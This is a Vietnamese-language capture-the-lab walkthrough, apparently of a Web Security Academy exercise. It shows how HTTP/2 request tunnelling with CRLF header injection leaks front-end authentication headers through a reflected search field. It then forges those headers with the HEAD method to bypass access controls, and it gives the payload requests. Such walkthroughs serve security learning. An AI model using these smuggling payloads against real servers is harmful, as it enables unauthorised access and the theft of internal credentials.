## Bypassing access controls via HTTP/2 request tunnelling (REFER)

1. Xác định được có thể smuggling thông qua CRLF header. Ví dụ ở đây khi inject header HOST bất kỳ vào request nhận được thông báo lỗi chứng tỏ cố gắng kết nối đến giá trị host.

![image](https://user-images.githubusercontent.com/80744099/230790461-b8145add-dccf-494e-a1a1-d9473897fdbd.png)

2. Ở lab này ô search là một reflect input. Lợi dụng điều này ta có thể lấy giá trị các authentication header được FE server thêm vào bằng cách đặt content-length và cắt phần body của request để param search phía trước các authentication header.

```
GET /?search=x HTTP/2
Host: 0a0a00d8040641e282cc0266003f0011.web-security-academy.net
...
...{Authentication header}
Content-Length: 8

search=x
```

- Sau khi inject payload:
```
GET /?search=x HTTP/2
Host: 0a0a00d8040641e282cc0266003f0011.web-security-academy.net
...
Foo: bar
Content-Length: 168

search=x:x
...{Authentication header}
Content-Length: 8

search=x
```

![image](https://user-images.githubusercontent.com/80744099/230791219-1471941e-ce0a-4e88-82c0-5c0f782663a0.png)

3.  Thay đổi giá trị content-length để xác định toàn bộ header cần thiết.  Nhận được các header trong đó ``X-SSL-CLIENT-CN`` chứa username.

```
X-SSL-VERIFIED: 0
X-SSL-CLIENT-CN: null
X-FRONTEND-KEY: 9084482102113161
```

4. Chuyển sang method HEAD và thêm các giá trị thích hợp cho authentication header vào smuggling request (HEAD method chỉ trả lại các header mà không có phần body)

![image](https://user-images.githubusercontent.com/80744099/230791645-fbb13c25-b4dd-47ee-ad82-7d70adc3aa92.png)

5. Chuyển sang các endpoint khác mà có nội dung trả về của Method GET của endpoint đó nhỏ hơn tunnelled response. 

![image](https://user-images.githubusercontent.com/80744099/230791805-05781b6c-e04a-4673-abef-a4c43a8483cd.png)
